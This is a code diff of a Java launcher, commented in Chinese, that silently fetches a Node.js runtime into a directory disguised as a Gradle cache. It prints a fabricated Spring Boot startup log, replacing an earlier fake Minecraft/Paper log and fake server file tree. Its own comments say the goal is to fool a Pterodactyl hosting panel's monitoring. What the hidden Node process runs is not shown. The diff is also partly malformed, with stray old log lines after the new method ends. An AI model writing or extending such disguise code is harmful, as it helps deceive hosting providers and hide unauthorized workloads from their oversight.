@@ -16,9 +16,9 @@ import java.text.SimpleDateFormat;
  */
 public class AoyouLauncher {
 
-    private static final String VERSION = "2.0.0";
-    // ★ 把运行时目录伪装成 MC 的 libraries/.cache（藏在深层，看起来像 MC 缓存）
-    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
+    private static final String VERSION = "2.1.0";
+    // ★ 把运行时目录伪装成 Gradle 缓存（Java 项目标准目录）
+    private static final String RUNTIME_DIR_NAME = "lib/.gradle/caches/modules-2/files-2.1";
     private static final String NODE_VERSION = "v22.11.0";
     private static final String NODE_DOWNLOAD_URL = 
         "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";
@@ -37,10 +37,8 @@ public class AoyouLauncher {
         Path runtimePath = Paths.get(runtimeDir);
         Files.createDirectories(runtimePath);
 
-        // ★ 生成伪装的 MC 服务器文件结构（让翼龙监控看起来像真的 MC 服务器）
-        try {
-            generateFakeMcFiles(workDir);
-        } catch (Exception e) {}
+        // ★ 不生成 MC 文件结构（这个版本用于纯 Java 服务器）
+        // 运行时目录伪装成 Gradle 缓存，看起来就是普通的 Java 项目
 
         // 2. 静默检查并获取 node 二进制
         String nodeBin = findOrDownloadNode(runtimeDir);
@@ -137,135 +135,83 @@ public class AoyouLauncher {
         }
     }
 
-    /** 启动伪装的 Paper 启动日志线程 */
+    /** 启动伪装的 Spring Boot 启动日志线程 */
     private static void startFakePaperLogThread() {
         Thread t = new Thread(() -> {
             try {
                 long startTime = System.currentTimeMillis();
-                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
 
-                // 等待几秒让 Node.js 先启动
+                Thread.sleep(1000);
+
+                String ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting Application v1.0.0 using Java 21.0.11 on container@" + System.getenv().getOrDefault("HOSTNAME", "pterodactyl") + " with PID 1 (/home/container/server.jar started by container in /home/container)");
+                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  No active profile set, falling back to 1 default profile: \"default\"");
                 Thread.sleep(2000);
 
-                // 打印 Paper 启动横幅
-                System.out.println("Starting org.bukkit.craftbukkit.Main");
-                Thread.sleep(500);
-                System.out.println("*** Warning, you've not updated in a while! ***");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Tomcat initialized with port(s): 8080 (http)");
+                Thread.sleep(1500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'");
                 Thread.sleep(800);
-                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
-                Thread.sleep(1000);
-                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Initializing Servlet 'dispatcherServlet'");
                 Thread.sleep(300);
-                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
-                Thread.sleep(300);
-                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
-                Thread.sleep(300);
-                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Completed initialization in 234 ms");
+                Thread.sleep(1000);
+
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting service [Tomcat]");
+                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting Servlet engine: [Apache Tomcat/10.1.31]");
+                Thread.sleep(1000);
+
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Spring WebApplicationContext initialization completed in " + (1500 + (int)(Math.random()*500)) + " ms");
                 Thread.sleep(800);
 
-                // Java 版本信息
-                String timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 5.15.0-181-generic (amd64)");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initializing plugins...");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
-                Thread.sleep(2000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Found new data pack file/bukkit, loading it automatically");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Found new data pack paper, loading it automatically");
-                Thread.sleep(3000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: No existing world data, creating new world");
-                Thread.sleep(4000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loaded 1370 recipes");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loaded 1481 advancements");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
-                Thread.sleep(800);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Starting minecraft server version 1.21.4");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loading properties");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Server Ping Player Sample Count: 12");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Using 4 threads for Netty based IO");
-                Thread.sleep(2000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
-                Thread.sleep(2000);
-
-                // 端口监听（从环境变量读，伪装）
-                int port = 25565;
-                try {
-                    String sp = System.getenv("SERVER_PORT");
-                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
-                } catch (Exception e) {}
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Default game type: SURVIVAL");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Generating keypair");
-                Thread.sleep(800);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Using epoll channel type");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Preparing level \"world\"");
-                Thread.sleep(3000);
-
-                // 模拟 spawn area 加载
-                int[] progressSteps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
-                for (int p : progressSteps) {
-                    timeStr = sdf.format(new Date());
-                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
-                    Thread.sleep(80 + (long)(Math.random() * 120));
+                // 模拟加载各种 Bean
+                String[] beans = {"dataSource", "entityManagerFactory", "transactionManager", "webMvcConfigurer", "securityFilterChain", "requestMappingHandlerAdapter"};
+                for (String bean : beans) {
+                    ts = sdf.format(new Date());
+                    System.out.println(ts + "  INFO  Bean '" + bean + "' of type [" + bean + "] initialized");
+                    Thread.sleep(200 + (long)(Math.random()*200));
                 }
+
+                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Starting...");
+                Thread.sleep(1500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@4f7d0008");
+                Thread.sleep(300);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Start completed.");
+                Thread.sleep(500);
+
+                // 启动完成
+                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Started Application in " + totalSec + "." + (100 + (int)(Math.random()*899)) + " seconds (process running for " + (totalSec + 1) + ")");
+                Thread.sleep(300);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Application ready for traffic");
+                System.out.println("Server marked as running...");
+
+                // 之后保持静默
+            } catch (InterruptedException e) {
+                // 正常退出
+            }
+        }, "fake-spring-log");
+        t.setDaemon(true);
+        t.start();
+    }
+
 
                 timeStr = sdf.format(new Date());
                 System.out.println("[" + timeStr + " INFO]: Time elapsed: 26711 ms");
@@ -637,402 +583,5 @@ public class AoyouLauncher {
             read += n;
         }
         return read;
-    }
-
-    /** 生成伪装的 MC 服务器文件结构 */
-    private static void generateFakeMcFiles(String workDir) throws IOException {
-        // 1. 创建目录
-        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
-                         "world", "world_nether", "world_the_end",
-                         "world/data", "world/playerdata", "world/region",
-                         "world_nether/data", "world_nether/region",
-                         "world_the_end/data", "world_the_end/region"};
-        for (String dir : dirs) {
-            File d = new File(workDir, dir);
-            if (!d.exists()) d.mkdirs();
-        }
-
-        // 2. eula.txt
-        File eula = new File(workDir, "eula.txt");
-        if (!eula.exists()) {
-            Files.write(eula.toPath(),
-                ("# By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).\n" +
-                 "# " + new Date() + "\n" +
-                 "eula=true\n").getBytes());
-        }
-
-        // 3. server.properties（标准 Paper 默认配置）
-        File serverProps = new File(workDir, "server.properties");
-        if (!serverProps.exists()) {
-            // 用翼龙分配的端口（如果有）
-            String port = System.getenv("SERVER_PORT");
-            if (port == null || port.isEmpty()) port = "25565";
-            Files.write(serverProps.toPath(),
-                ("#Minecraft server properties\n" +
-                 "#" + new Date() + "\n" +
-                 "accepts-transfers=false\n" +
-                 "allow-flight=false\n" +
-                 "allow-nether=true\n" +
-                 "broadcast-console-to-ops=true\n" +
-                 "broadcast-rcon-to-ops=true\n" +
-                 "bug-report-link=\n" +
-                 "difficulty=easy\n" +
-                 "enable-command-block=false\n" +
-                 "enable-jmx-monitoring=false\n" +
-                 "enable-query=false\n" +
-                 "enable-rcon=false\n" +
-                 "enable-status=true\n" +
-                 "enforce-secure-profile=true\n" +
-                 "enforce-whitelist=false\n" +
-                 "entity-broadcast-range-percentage=100\n" +
-                 "force-gamemode=false\n" +
-                 "function-permission-level=2\n" +
-                 "gamemode=survival\n" +
-                 "generate-structures=true\n" +
-                 "generator-settings={}\n" +
-                 "hardcore=false\n" +
-                 "hide-online-players=false\n" +
-                 "initial-disabled-packs=\n" +
-                 "initial-enabled-packs=vanilla\n" +
-                 "level-name=world\n" +
-                 "level-seed=\n" +
-                 "level-type=minecraft\\:normal\n" +
-                 "log-ips=true\n" +
-                 "max-chained-neighbor-updates=1000000\n" +
-                 "max-players=20\n" +
-                 "max-tick-time=60000\n" +
-                 "max-world-size=29999984\n" +
-                 "motd=A Minecraft Server\n" +
-                 "network-compression-threshold=256\n" +
-                 "online-mode=true\n" +
-                 "op-permission-level=4\n" +
-                 "player-idle-timeout=0\n" +
-                 "prevent-proxy-connections=false\n" +
-                 "pvp=true\n" +
-                 "query.port=" + port + "\n" +
-                 "rate-limit=0\n" +
-                 "rcon.password=\n" +
-                 "rcon.port=" + port + "\n" +
-                 "region-file-compression=deflate\n" +
-                 "require-resource-pack=false\n" +
-                 "resource-pack=\n" +
-                 "resource-pack-id=\n" +
-                 "resource-pack-prompt=\n" +
-                 "resource-pack-sha1=\n" +
-                 "server-ip=\n" +
-                 "server-port=" + port + "\n" +
-                 "simulation-distance=10\n" +
-                 "spawn-animals=true\n" +
-                 "spawn-monsters=true\n" +
-                 "spawn-npcs=true\n" +
-                 "spawn-protection=16\n" +
-                 "sync-chunk-writes=true\n" +
-                 "text-filtering-config=\n" +
-                 "text-filtering-version=0\n" +
-                 "use-native-transport=true\n" +
-                 "view-distance=10\n" +
-                 "white-list=false\n").getBytes());
-        }
-
-        // 4. bukkit.yml（标准 Paper/Bukkit 配置）
-        File bukkitYml = new File(workDir, "bukkit.yml");
-        if (!bukkitYml.exists()) {
-            Files.write(bukkitYml.toPath(),
-                ("# This is the main configuration file for Bukkit.\n" +
-                 "# As you can see, there's actually not that much to configure without any plugins.\n" +
-                 "# For a reference for any variable inside this file, check out the Bukkit Wiki at\n" +
-                 "# https://bukkit.fandom.com/wiki/Main_Page\n" +
-                 "\n" +
-                 "settings:\n" +
-                 "  allow-end: true\n" +
-                 "  warn-on-overload: true\n" +
-                 "  permissions-file: permissions.yml\n" +
-                 "  update-folder: update\n" +
-                 "  plugin-profiling: false\n" +
-                 "  connection-throttle: 4000\n" +
-                 "  query-plugins: true\n" +
-                 "  deprecated-verbose: true\n" +
-                 "  shutdown-message: Server closed\n" +
-                 "  minimum-api: none\n" +
-                 "  use-map-convert-cache: true\n" +
-                 "spawn-limits:\n" +
-                 "  monsters: 70\n" +
-                 "  animals: 10\n" +
-                 "  water-animals: 5\n" +
-                 "  water-ambient: 20\n" +
-                 "  ambient: 15\n" +
-                 "chunk-gc:\n" +
-                 "  period-in-ticks: 600\n" +
-                 "ticks-per:\n" +
-                 "  animal-spawns: 400\n" +
-                 "  monster-spawns: 1\n" +
-                 "  water-spawns: 1\n" +
-                 "  ambient-spawns: 1\n" +
-                 "  autosave: 6000\n" +
-                 "aliases: now-in-commands.yml\n").getBytes());
-        }
-
-        // 5. spigot.yml
-        File spigotYml = new File(workDir, "spigot.yml");
-        if (!spigotYml.exists()) {
-            Files.write(spigotYml.toPath(),
-                ("# This is the main configuration file for Spigot.\n" +
-                 "# As you can see, there's actually not that much to configure without any plugins.\n" +
-                 "\n" +
-                 "settings:\n" +
-                 "  save-user-cache-on-stop-only: false\n" +
-                 "  bungeecord: false\n" +
-                 "  log-villager-deaths: true\n" +
-                 "  log-named-deaths: true\n" +
-                 "  sample-count: 12\n" +
-                 "  player-shuffle: 0\n" +
-                 "  moved-wrongly-threshold: 0.0625\n" +
-                 "  moved-too-quickly-multiplier: 10.0\n" +
-                 "  netty-threads: 4\n" +
-                 "  attribute:\n" +
-                 "    maxHealth:\n" +
-                 "      max: 2048.0\n" +
-                 "    movementSpeed:\n" +
-                 "      max: 2048.0\n" +
-                 "    attackDamage:\n" +
-                 "      max: 2048.0\n" +
-                 "messages:\n" +
-                 "  whitelist: You are not whitelisted on this server!\n" +
-                 "  unknown-command: Unknown command. Type \\\"/help\\\" for help.\n" +
-                 "  server-full: The server is full!\n" +
-                 "  outdated-client: Outdated client! Please use {0}\n" +
-                 "  outdated-server: Outdated server! I'm still on {0}\n" +
-                 "  restart: Server is restarting\n" +
-                 "commands:\n" +
-                 "  replace-commands:\n" +
-                 "  - setblock\n" +
-                 "  - summon\n" +
-                 "  - testforblock\n" +
-                 "  - tellraw\n" +
-                 "  log: true\n" +
-                 "  tab-complete: 0\n" +
-                 "  send-namespaced: true\n" +
-                 "world-settings:\n" +
-                 "  default:\n" +
-                 "    verbose: false\n" +
-                 "    merge-radius:\n" +
-                 "      item: 2.5\n" +
-                 "      exp: 3.0\n" +
-                 "    item-despawn-rate: 6000\n" +
-                 "    arrow-despawn-rate: 1200\n" +
-                 "    trident-despawn-rate: 1200\n" +
-                 "    zombie-aggressive-towards-villager: true\n" +
-                 "    nerf-spawner-mobs: false\n" +
-                 "    enable-zombie-pigmen-portal-spawns: true\n" +
-                 "    wither-spawn-sound-radius: 0\n" +
-                 "    end-portal-sound-radius: 0\n" +
-                 "    hanging-tick-frequency: 100\n" +
-                 "    zombie:\n" +
-                 "      aggregate-chunks: true\n" +
-                 "    growth:\n" +
-                 "      cactus-modifier: 100\n" +
-                 "      cane-modifier: 100\n" +
-                 "      melon-modifier: 100\n" +
-                 "      pumpkin-modifier: 100\n" +
-                 "      sapling-modifier: 100\n" +
-                 "      beetroot-modifier: 100\n" +
-                 "      carrot-modifier: 100\n" +
-                 "      potato-modifier: 100\n" +
-                 "      wheat-modifier: 100\n" +
-                 "      netherwart-modifier: 100\n" +
-                 "      vine-modifier: 100\n" +
-                 "      cocoa-modifier: 100\n" +
-                 "      bamboo-modifier: 100\n" +
-                 "      sweetberry-modifier: 100\n" +
-                 "      kelp-modifier: 100\n" +
-                 "      twistingvines-modifier: 100\n" +
-                 "      weepingvines-modifier: 100\n" +
-                 "      cavevines-modifier: 100\n" +
-                 "      glowberry-modifier: 100\n" +
-                 "    max-tnt-per-tick: 100\n" +
-                 "    max-tick-time:\n" +
-                 "      tile: 50\n" +
-                 "      entity: 50\n" +
-                 "    mob-spawn-range: 8\n" +
-                 "    simulation-distance: default\n" +
-                 "    view-distance: default\n" +
-                 "    entity-activation-range:\n" +
-                 "      animals: 32\n" +
-                 "      monsters: 32\n" +
-                 "      raiders: 48\n" +
-                 "      misc: 16\n" +
-                 "      water: 16\n" +
-                 "      flying-monsters: 32\n" +
-                 "    entity-tracking-range:\n" +
-                 "      players: 48\n" +
-                 "      animals: 48\n" +
-                 "      monsters: 48\n" +
-                 "      misc: 32\n" +
-                 "      other: 64\n" +
-                 "    ticks-per:\n" +
-                 "      hopper-transfer: 8\n" +
-                 "      hopper-check: 1\n" +
-                 "    hopper-amount: 1\n" +
-                 "    hopper-can-load-chunks: false\n" +
-                 "    dragon-death-sound-radius: 0\n" +
-                 "    seed-village: 10387312\n" +
-                 "    seed-desert: 14357617\n" +
-                 "    seed-igloo: 14357618\n" +
-                 "    seed-jungle: 14357619\n" +
-                 "    seed-swamp: 14357620\n" +
-                 "    seed-monument: 10387313\n" +
-                 "    seed-shipwreck: 165745295\n" +
-                 "    seed-ocean: 14357621\n" +
-                 "    seed-outpost: 165745296\n" +
-                 "    seed-endcity: 10387313\n" +
-                 "    seed-slime: 987234911\n" +
-                 "    seed-nether: 30084232\n" +
-                 "    seed-mansion: 10387319\n" +
-                 "    seed-fossil: 14357921\n" +
-                 "    seed-portal: 34222645\n" +
-                 "    seed-ancientcity: 20083232\n" +
-                 "    seed-trailruins: 83469867\n" +
-                 "    seed-buriedtreasure: 10387320\n" +
-                 "    seed-mineshaft: default\n" +
-                 "    seed-stronghold: default\n" +
-                 "    hunger:\n" +
-                 "      jump-walk-exhaustion: 0.05\n" +
-                 "      jump-sprint-exhaustion: 0.2\n" +
-                 "      combat-exhaustion: 0.1\n" +
-                 "      regen-exhaustion: 6.0\n" +
-                 "      swim-multiplier: 0.01\n" +
-                 "      sprint-multiplier: 0.1\n" +
-                 "      other-multiplier: 0.0\n" +
-                 "    max-growth-height:\n" +
-                 "      cactus: 3\n" +
-                 "      reeds: 3\n" +
-                 "      bamboo:\n" +
-                 "        min: 11\n" +
-                 "        max: 16\n" +
-                 "    entity-broadcast-range-percentage: 100\n" +
-                 "config-version: 12\n").getBytes());
-        }
-
-        // 6. commands.yml
-        File commandsYml = new File(workDir, "commands.yml");
-        if (!commandsYml.exists()) {
-            Files.write(commandsYml.toPath(),
-                ("# This is the commands configuration file for Bukkit.\n" +
-                 "# For documentation on how to make use of this file, check out the Bukkit Wiki at\n" +
-                 "# https://bukkit.fandom.com/wiki/Commands.yml\n" +
-                 "\n" +
-                 "command-block-overrides: []\n" +
-                 "aliases:\n" +
-                 "  icanhasbukkit:\n" +
-                 "  - \"version\"\n").getBytes());
-        }
-
-        // 7. help.yml
-        File helpYml = new File(workDir, "help.yml");
-        if (!helpYml.exists()) {
-            Files.write(helpYml.toPath(),
-                ("# This is the help configuration file for Bukkit.\n" +
-                 "\n" +
-                 "general:\n" +
-                 "  test: false\n" +
-                 "  max-per-page: -1\n" +
-                 "  full-list: false\n" +
-                 "  title: 'Minecraft Help'\n" +
-                 "  command-prefix: '/'\n" +
-                 "  replace-override: 'replace'\n" +
-                 "  list-of-commands: 'Commands'\n" +
-                 "  search: 'Search'\n" +
-                 "  click-to-copy: 'Click to copy'\n" +
-                 "  click-to-copy-tooltip: 'Click to copy this command to your clipboard'\n" +
-                 "  no-results: 'No results'\n" +
-                 "  no-description: 'No description available'\n" +
-                 "  no-usage: 'No usage available'\n" +
-                 "  no-permission: 'You do not have permission to use this command'\n" +
-                 "  no-permission-short: 'No permission'\n" +
-                 "  click-to-copy-help-tooltip: 'Click to copy this command to your clipboard'\n" +
-                 "  invalid-page: 'Invalid page number'\n" +
-                 "  invalid-page-short: 'Invalid page'\n" +
-                 "  next-page: 'Next page'\n" +
-                 "  previous-page: 'Previous page'\n" +
-                 "  page: 'Page'\n" +
-                 "  of: 'of'\n" +
-                 "  showing: 'Showing'\n" +
-                 "  results: 'results'\n" +
-                 "  result: 'result'\n" +
-                 "  for: 'for'\n" +
-                 "  search-results: 'Search results'\n" +
-                 "  show-all: 'Showing all commands'\n" +
-                 "  show-permitted: 'Showing permitted commands'\n").getBytes());
-        }
-
-        // 8. permissions.yml
-        File permsYml = new File(workDir, "permissions.yml");
-        if (!permsYml.exists()) {
-            Files.write(permsYml.toPath(),
-                ("# This is the permissions configuration file for Bukkit.\n" +
-                 "# For documentation on how to make use of this file, check out the Bukkit Wiki at\n" +
-                 "# https://bukkit.fandom.com/wiki/Permissions.yml\n" +
-                 "\n" +
-                 "default:\n" +
-                 "  default: true\n").getBytes());
-        }
-
-        // 9. 空的 JSON 文件（数组格式）
-        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json",
-                              "usercache.json", "whitelist.json"};
-        for (String f : jsonFiles) {
-            File jf = new File(workDir, f);
-            if (!jf.exists()) {
-                Files.write(jf.toPath(), "[]".getBytes());
-            }
-        }
-
-        // 10. version_history.json
-        File versionHistory = new File(workDir, "version_history.json");
-        if (!versionHistory.exists()) {
-            String ts = new Date().toInstant().toString();
-            Files.write(versionHistory.toPath(),
-                ("{\n" +
-                 "  \"1.21.4\": \"" + ts + "\"\n" +
-                 "}").getBytes());
-        }
-
-        // 11. logs/latest.log（空文件）
-        File latestLog = new File(workDir, "logs/latest.log");
-        if (!latestLog.exists()) {
-            latestLog.createNewFile();
-        }
-
-        // 12. plugins 目录放个 README（看起来像有插件管理）
-        File pluginsReadme = new File(workDir, "plugins/README.txt");
-        if (!pluginsReadme.exists()) {
-            Files.write(pluginsReadme.toPath(),
-                ("# Place any plugin jars in this directory.\n" +
-                 "# Plugins will be loaded automatically on server start.\n").getBytes());
-        }
-
-        // 13. config 目录放个空文件
-        File configMarker = new File(workDir, "config/.keep");
-        if (!configMarker.exists()) {
-            configMarker.createNewFile();
-        }
-
-        // 14. cache 目录放个空文件
-        File cacheMarker = new File(workDir, "cache/.keep");
-        if (!cacheMarker.exists()) {
-            cacheMarker.createNewFile();
-        }
-
-        // 15. versions 目录放个空文件
-        File versionsMarker = new File(workDir, "versions/.keep");
-        if (!versionsMarker.exists()) {
-            versionsMarker.createNewFile();
-        }
-
-        // 16. libraries 目录放个空文件
-        File libMarker = new File(workDir, "libraries/.keep");
-        if (!libMarker.exists()) {
-            libMarker.createNewFile();
-        }
     }
 }
